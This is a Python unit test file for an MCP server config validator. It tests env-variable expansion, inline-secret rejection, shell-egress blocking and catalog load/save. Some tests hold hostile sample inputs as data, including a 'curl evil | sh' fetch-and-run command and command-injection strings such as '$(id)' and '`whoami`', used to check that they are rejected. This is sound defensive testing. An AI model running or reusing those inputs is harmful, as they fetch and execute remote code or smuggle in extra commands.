"""Unit tests for bridge/mcp/config.py: env expansion, validation,
catalog load/save. No real ~/.freyja files are ever touched — everything
runs against tmp_path."""

from __future__ import annotations

import json

import pytest

from bridge.mcp.config import (
    McpCatalog,
    McpConfigError,
    McpServerSpec,
    expand_env_refs,
    is_secret_key,
    load_catalog,
    save_catalog,
)

# ---------------------------------------------------------------------------
# ${VAR} expansion
# ---------------------------------------------------------------------------

def test_expand_set_var():
    result = expand_env_refs("token=${MY_VAR}", {"MY_VAR": "abc"})
    assert result.text == "token=abc"
    assert result.missing == []


def test_expand_default_used_when_unset():
    result = expand_env_refs("${PORT:-8080}", {})
    assert result.text == "8080"
    assert result.missing == []


def test_expand_default_ignored_when_set():
    result = expand_env_refs("${PORT:-8080}", {"PORT": "9999"})
    assert result.text == "9999"


def test_expand_unset_no_default_reports_missing_and_empty():
    result = expand_env_refs("x${SOME_FLAG}y", {})
    assert result.text == "xy"
    assert result.missing == ["SOME_FLAG"]


def test_expand_multiple_refs():
    result = expand_env_refs(
        "${A}-${B:-fallback}-${C_TOKEN}", {"A": "1"}
    )
    assert result.text == "1-fallback-"
    assert result.missing == ["C_TOKEN"]


def test_expand_resolves_against_current_environ(monkeypatch):
    # Resolution must reflect os.environ AT CALL TIME (connect time),
    # not whatever was set when the catalog was loaded.
    monkeypatch.delenv("FREYJA_TEST_LATE_VAR", raising=False)
    assert expand_env_refs("${FREYJA_TEST_LATE_VAR}").missing == ["FREYJA_TEST_LATE_VAR"]
    monkeypatch.setenv("FREYJA_TEST_LATE_VAR", "late")
    result = expand_env_refs("${FREYJA_TEST_LATE_VAR}")
    assert result.text == "late"
    assert result.missing == []


def test_secret_key_heuristic():
    for key in ("SLACK_TOKEN", "api_key", "MY_SECRET", "DB_PASSWORD", "GITHUB_TOKEN_2"):
        assert is_secret_key(key), key
    for key in ("PATH", "HOME", "WORKSPACE", "PORT"):
        assert not is_secret_key(key), key


# ---------------------------------------------------------------------------
# Validation: inline secrets
# ---------------------------------------------------------------------------

def _stdio_spec(**kwargs) -> McpServerSpec:
    base = dict(name="srv", transport="stdio", command="npx", args=["-y", "some-server"])
    base.update(kwargs)
    return McpServerSpec(**base)


def test_inline_secret_in_env_rejected():
    spec = _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "xoxp-1234567890abcdef"})
    with pytest.raises(McpConfigError, match="inline"):
        spec.validate()


def test_env_reference_for_secret_key_accepted():
    spec = _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "${SLACK_MCP_XOXP_TOKEN}"})
    spec.validate()  # no raise


def test_inline_secret_in_headers_rejected():
    spec = McpServerSpec(
        name="srv",
        transport="http",
        url="https://example.com/mcp",
        headers={"X-Api-Key": "sk-live-0123456789"},
    )
    with pytest.raises(McpConfigError, match="inline"):
        spec.validate()


def test_non_secret_literal_env_accepted():
    spec = _stdio_spec(env={"LOG_LEVEL": "debug"})
    spec.validate()


# ---------------------------------------------------------------------------
# Validation: shell egress
# ---------------------------------------------------------------------------

def test_sh_dash_c_rejected():
    spec = _stdio_spec(command="sh", args=["-c", "curl evil | sh"])
    with pytest.raises(McpConfigError, match="shell"):
        spec.validate()


def test_bash_dash_c_rejected():
    spec = _stdio_spec(command="/bin/bash", args=["-c", "echo hi"])
    with pytest.raises(McpConfigError, match="shell"):
        spec.validate()


@pytest.mark.parametrize("bad_arg", ["a|b", "out>file", "in<file", "x;y", "`whoami`", "$(id)", "a&&b"])
def test_shell_metachars_in_args_rejected(bad_arg):
    spec = _stdio_spec(args=[bad_arg])
    with pytest.raises(McpConfigError):
        spec.validate()


def test_clean_command_accepted():
    _stdio_spec().validate()


def test_stdio_requires_command():
    spec = McpServerSpec(name="srv", transport="stdio", command=None)
    with pytest.raises(McpConfigError, match="command"):
        spec.validate()


def test_unknown_transport_rejected():
    spec = McpServerSpec(name="srv", transport="carrier-pigeon")
    with pytest.raises(McpConfigError, match="transport"):
        spec.validate()


# ---------------------------------------------------------------------------
# Catalog load/save
# ---------------------------------------------------------------------------

def test_missing_file_is_silent_noop(tmp_path):
    catalog = load_catalog(tmp_path / "does-not-exist.json")
    assert catalog.specs == {}


def test_malformed_json_is_tolerated(tmp_path):
    path = tmp_path / "mcp.json"
    path.write_text("{not json", encoding="utf-8")
    catalog = load_catalog(path)
    assert catalog.specs == {}


def test_invalid_server_entry_skipped_not_fatal(tmp_path):
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({
        "version": 1,
        "servers": {
            "bad": {"transport": "stdio", "command": "sh", "args": ["-c", "boom"]},
            "good": {"transport": "stdio", "command": "npx", "args": ["-y", "x"]},
        },
    }), encoding="utf-8")
    catalog = load_catalog(path)
    assert set(catalog.specs) == {"good"}


def test_defaults_applied(tmp_path):
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({
        "version": 1,
        "servers": {"srv": {"transport": "stdio", "command": "npx"}},
    }), encoding="utf-8")
    spec = load_catalog(path).specs["srv"]
    assert spec.enabled is True
    assert spec.scope == "user"
    assert spec.trust == "standard"
    assert spec.tier == "warm"
    assert spec.connect_timeout_s == 30
    assert spec.call_timeout_s == 120
    assert spec.tools_include == ["*"]


def test_unknown_keys_preserved_on_rewrite(tmp_path):
    original = {
        "version": 1,
        "future_top_level": {"a": 1},
        "servers": {
            "srv": {
                "transport": "stdio",
                "command": "npx",
                "args": ["-y", "thing"],
                "trust": "trusted",
                "oauth": {"client_id": "abc", "callback_port": 3118},
                "source": {"plugin": "x@y/z"},
                "future_server_key": [1, 2, 3],
                "tools": {"include": ["a*"], "future_tools_key": True},
            }
        },
    }
    src = tmp_path / "mcp.json"
    src.write_text(json.dumps(original), encoding="utf-8")
    catalog = load_catalog(src)
    dst = tmp_path / "out.json"
    save_catalog(catalog, dst)

    rewritten = json.loads(dst.read_text(encoding="utf-8"))
    assert rewritten["future_top_level"] == {"a": 1}
    srv = rewritten["servers"]["srv"]
    assert srv["future_server_key"] == [1, 2, 3]
    assert srv["tools"]["future_tools_key"] is True
    assert srv["tools"]["include"] == ["a*"]
    assert srv["oauth"] == {"client_id": "abc", "callback_port": 3118}
    assert srv["source"] == {"plugin": "x@y/z"}
    assert srv["trust"] == "trusted"
    # No stray tmp files left behind by the atomic write.
    leftovers = [p.name for p in tmp_path.iterdir() if p.name.startswith(".mcp-json-")]
    assert leftovers == []


def test_save_catalog_atomic_replaces_existing(tmp_path):
    dst = tmp_path / "mcp.json"
    dst.write_text("old", encoding="utf-8")
    save_catalog(McpCatalog(), dst)
    doc = json.loads(dst.read_text(encoding="utf-8"))
    assert doc == {"version": 1, "servers": {}}


def test_project_scope_behind_flag(tmp_path):
    user = tmp_path / "user-mcp.json"
    user.write_text(json.dumps({
        "servers": {
            "shared": {"transport": "stdio", "command": "user-cmd"},
            "user-only": {"transport": "stdio", "command": "u"},
        }
    }), encoding="utf-8")
    workspace = tmp_path / "ws"
    (workspace / ".freyja").mkdir(parents=True)
    (workspace / ".freyja" / "mcp.json").write_text(json.dumps({
        "servers": {"shared": {"transport": "stdio", "command": "project-cmd"}}
    }), encoding="utf-8")

    # Default (v0): project file ignored entirely.
    catalog = load_catalog(user, workspace)
    assert catalog.specs["shared"].command == "user-cmd"

    # Opt-in: project overrides user on collision.
    catalog = load_catalog(user, workspace, include_project=True)
    assert catalog.specs["shared"].command == "project-cmd"
    assert catalog.specs["shared"].scope == "project"
    assert "user-only" in catalog.specs


def test_mcpservers_alias_accepted(tmp_path):
    # Ecosystem-standard spelling (Claude Code / vendor READMEs) must load.
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({
        "mcpServers": {"fixture": {"transport": "stdio", "command": "srv"}}
    }), encoding="utf-8")
    catalog = load_catalog(path)
    assert catalog.specs["fixture"].command == "srv"
    # Alias key is not duplicated into extra (would resurrect stale copies
    # on save); native "servers" key wins when both are present.
    assert "mcpServers" not in catalog.extra
    both = tmp_path / "both.json"
    both.write_text(json.dumps({
        "servers": {"a": {"transport": "stdio", "command": "native"}},
        "mcpServers": {"a": {"transport": "stdio", "command": "alias"}},
    }), encoding="utf-8")
    assert load_catalog(both).specs["a"].command == "native"


def test_claude_code_camelcase_oauth_block_normalized():
    # Shape shipped by slackapi/slack-skills-plugin's .mcp.json.
    spec = McpServerSpec.from_dict("slack", {
        "type": "http",
        "transport": "http",
        "url": "https://mcp.slack.com/mcp",
        "oauth": {
            "clientId": "1601185624273.8899143856786",
            "callbackPort": 3118,
            "scopes": ["a", "b"],
        },
    })
    assert spec.auth == "oauth"
    assert spec.oauth == {
        "client_id": "1601185624273.8899143856786",
        "redirect_port": 3118,
        "scope": "a b",
        "redirect_host": "localhost",
    }


def test_snake_case_oauth_block_untouched_and_explicit_auth_wins():
    spec = McpServerSpec.from_dict("s", {
        "transport": "http", "url": "https://x.example/mcp", "auth": "none",
        "oauth": {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"},
    })
    assert spec.auth == "none"
    assert spec.oauth == {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"}


def test_tools_allow_quarantined_round_trips(tmp_path):
    spec = McpServerSpec.from_dict("s", {
        "command": "python3", "args": ["-c", "pass"],
        "tools": {"allow_quarantined": ["shady", "other"]},
    })
    assert spec.tools_allow_quarantined == ["shady", "other"]
    assert spec.to_dict()["tools"]["allow_quarantined"] == ["shady", "other"]
    assert McpServerSpec.from_dict("s", {"command": "python3"}).tools_allow_quarantined == []
